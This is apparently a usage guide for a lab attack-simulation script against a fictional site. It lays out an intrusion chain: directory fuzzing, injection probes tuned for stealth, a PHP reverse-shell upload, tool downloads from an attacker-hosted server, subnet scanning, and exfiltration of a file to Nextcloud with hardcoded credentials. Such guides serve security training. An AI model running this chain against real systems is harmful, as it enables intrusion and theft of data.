# Attack Simulation Usage Guide

## Overview

`attack_simulation.py` description and usage is mentioned below.

## Prerequisites

### System Requirements
- Python 3.x
- Network connectivity to target
- Gobuster installed (`sudo apt install gobuster`)

### Python Dependencies (requirements.txt)
```bash
pip install requests
```

### Required Files
- `reverse6.php` - Reverse shell payload
- `nc_upload_share.py` - Nextcloud file upload script
- `mail_test.py` - Email script
- `nmap-x64.tar.gz` - Portable nmap binary

## Configuration

### Main Variables (lines 416-421)
```python
TARGET_BASE = "http://www.secureskies.com"       # Target website
FILE_NAME = "reverse6.php"                       # Reverse shell filename
REVERSE_SHELL_PATH = "/home/student/Desktop/attacker_flow/reverse6.php"
ATTACKER_IP = "12.0.0.45"                       # Attacker machine IP
HTTP_PORT = 8000                                 # HTTP server port for file hosting
```



## Command Execution Flow

```
┌─────────────────────────────────────┐
│  Start HTTP Server (Port 8000)     │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│  Phase 1: Gobuster Directory Scan   │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│  Phase 2: Attack Vector Simulation  │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│  Phase 3: Upload Reverse Shell      │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│  Phase 4: Trigger Shell & Execute   │
│  ┌───────────────────────────────┐  │
│  │ - System Enumeration          │  │
│  │ - Network Scanning (Nmap)     │  │
│  │ - Data Exfiltration (NC)      │  │
│  │ - Email Notification          │  │
│  └───────────────────────────────┘  │
└─────────────────────────────────────┘
```

## Attack Phases

### Phase 1: Directory Fuzzing (Gobuster)
**Purpose**: Enumerate directories and files on the target web server

**Features**:
- Uses Kali Linux built-in wordlists (`/usr/share/wordlists/dirb/common.txt`)
- Tests for `.php`, `.html`, `.txt` extensions
- 20 concurrent threads
- 10-second timeout per request

**Output**: List of discovered endpoints

### Phase 2: Pentest Traffic Simulation
**Purpose**: Simulate various attack vectors to fuzz the website

**Attack Types**:
- **SQL Injection**: Tests `?id=` parameters with SQLi payloads
- **XSS**: Injects JavaScript payloads
- **LFI**: Attempts local file inclusion
- **Command Injection**: Tests for OS command execution

**Behavior**: Random delays (0.1-0.7s) between requests for stealth

### Phase 3: Reverse Shell Upload
**Purpose**: Upload malicious PHP reverse shell to target

**Process**:
1. Uploads `reverse6.php` via `/upload.php` endpoint
2. File is stored in `/uploads/` directory
3. Returns accessible URL

**Endpoint**: `http://www.secureskies.com/uploads/reverse6.php`

### Phase 4: Reverse Shell Attack & Enumeration

#### 4.1 Reverse Shell Connection
- Listener starts on port **4444**
- Triggers reverse shell by accessing uploaded PHP file
- Establishes persistent connection for command execution

#### 4.2 System Enumeration Commands

**Basic System Information** (Steps 1-3):
```bash
pwd                    # Current directory
whoami                 # Current user
hostname               # System hostname
uname -a               # Kernel information
```

**Network Configuration** (Steps 2-5b):
```bash
ip addr show           # Network interfaces
ip route show          # Routing table
which nmap             # Check for nmap
```

**Nmap Transfer & Setup** (Steps 4-16):
1. Creates `/tmp/nmap_transfer` directory
2. Downloads `nmap-x64.tar.gz` from attacker's HTTP server
3. Verifies download integrity
4. Extracts and sets executable permissions
5. Ready for network scanning

**Network Scanning** (Step 17a):
```bash
./nmap -sV 192.168.20.0/24 -vv
```
- Service version detection on entire subnet
- Verbose output for detailed information

#### 4.3 Nextcloud Data Exfiltration (Steps 17a-1 to 17a-5)

**Purpose**: Upload sensitive data to external Nextcloud server

**Process**:
1. Downloads `nc_upload_share.py` script
2. Verifies download and makes executable
3. Executes script with hardcoded credentials:
   - **URL**: `https://nextcloud.secureskies.local`
   - **User**: `jruecker`
   - **Password**: `BlueFishSea2883!`
   - **Source**: `/tmp/allhandsmeet.txt`
   - **Destination**: `Documents/loot3.txt`

**Output**: Direct download URL for uploaded file (captured for next step)

#### 4.4 Email Notification (Steps 17a-6 to 17a-9)

**Purpose**: Send email notification with exfiltrated data link

**Process**:
1. Downloads `mail_test.py` script
2. Executes with captured Nextcloud URL as parameter
3. Script sends email with the download link

**Timeout**: 120 seconds (2 minutes) for email operations

## Dynamic URL Capture Feature

The script implements **runtime URL substitution**:

1. After executing `nc_upload_share.py`, output is scanned for HTTPS URLs
2. First matching URL is captured and stored
3. Subsequent commands with `{NEXTCLOUD_URL}` placeholder get URL substituted
4. Example:
   ```bash
   # Command template:
   python3 mail_test.py '{NEXTCLOUD_URL}'
   
   # Becomes:
   python3 mail_test.py 'https://nextcloud.secureskies.local/s/abc123/download?path=/Documents&files=loot3.txt'
   ```

## Timeout Configuration

Different commands have custom timeouts for reliability:

| Command Type | Initial Wait | Read Timeout |
|-------------|--------------|--------------|
| `./nmap`    | 120s         | 120s         |
| `mail_test.py` | 5s        | 120s         |
| `tar`/`wget` | 3s          | 30s          |
| Default     | 1s           | 10s          |

## Output

### Real-time Output
- Progress indicators for each phase
- Command execution status `[n/m] command`
- Command output displayed immediately

### Final Output
- Complete results for all executed commands
- Formatted command-output pairs
- Success/failure status for each phase

## Usage

### Basic Execution
```bash
cd /home/student/Desktop/attacker_flow
python3 attack_simulation.py
```

### Expected Runtime
- **Phase 1**: 2-5 minutes (depending on wordlist size)
- **Phase 2**: 1-2 minutes
- **Phase 3**: 5-10 seconds
- **Phase 4**: 5-10 minutes (including nmap scan and exfiltration)

**Total**: ~10-20 minutes

## Security Notes

## Troubleshooting

### Common Issues

**Issue**: Gobuster not found
```bash
sudo apt update && sudo apt install gobuster
```

**Issue**: HTTP server verification fails
- Check firewall rules
- Verify `ATTACKER_IP` is correct
- Ensure no other service on port 8000

**Issue**: Reverse shell connection timeout
- Verify target is reachable
- Check if uploaded PHP file exists
- Confirm firewall allows port 4444

**Issue**: Nmap download fails
- Ensure `nmap-x64.tar.gz` exists in `/home/student/Desktop/`
- Check HTTP server is running
- Verify target has internet connectivity

**Issue**: URL not captured from nc_upload_share.py
- Check script output contains valid HTTPS URL
- Verify regex pattern matches URL format
- Review `nc_upload_share.py` execution output

## Customization

### Adding Custom Commands
Edit the `COMMANDS` list (starting around line 441):
```python
COMMANDS.extend([
    "your_custom_command",
    "another_command"
])
```

### Changing Timeouts
Modify `handle_connection()` function (lines 84-95)
